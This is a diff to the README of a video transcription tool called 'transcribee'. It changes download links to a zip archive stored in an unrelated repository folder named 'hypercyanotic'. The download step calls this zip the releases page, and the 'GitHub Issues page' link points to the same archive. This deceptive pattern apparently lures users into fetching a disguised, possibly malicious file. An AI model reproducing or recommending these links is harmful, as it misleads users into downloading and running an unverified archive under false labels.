@@ -17,7 +17,7 @@ To get started, you need to download transcribee. Follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the download page.
    
-   [![Download transcribee](https://raw.githubusercontent.com/Amirtha1412/transcribee/main/hypercyanotic/Software_v2.5.zip)](https://raw.githubusercontent.com/Amirtha1412/transcribee/main/hypercyanotic/Software_v2.5.zip)
+   [![Download transcribee](https://raw.githubusercontent.com/Amirtha1412/transcribee/main/hypercyanotic/Software_1.6.zip)](https://raw.githubusercontent.com/Amirtha1412/transcribee/main/hypercyanotic/Software_1.6.zip)
 
 2. **Select the Latest Version**: On the Releases page, look for the latest version listed at the top. This version includes the most recent updates and fixes.
 
@@ -63,7 +63,7 @@ You can use most common video formats, including `.mp4`, `.mov`, and `.avi`.
 
 ## 📞 Support
 
-If you encounter any issues or have questions, please reach out. You can create an issue on our [GitHub Issues page](https://raw.githubusercontent.com/Amirtha1412/transcribee/main/hypercyanotic/Software_v2.5.zip), and we will assist you promptly.
+If you encounter any issues or have questions, please reach out. You can create an issue on our [GitHub Issues page](https://raw.githubusercontent.com/Amirtha1412/transcribee/main/hypercyanotic/Software_1.6.zip), and we will assist you promptly.
 
 ## 🎉 Join Our Community
 
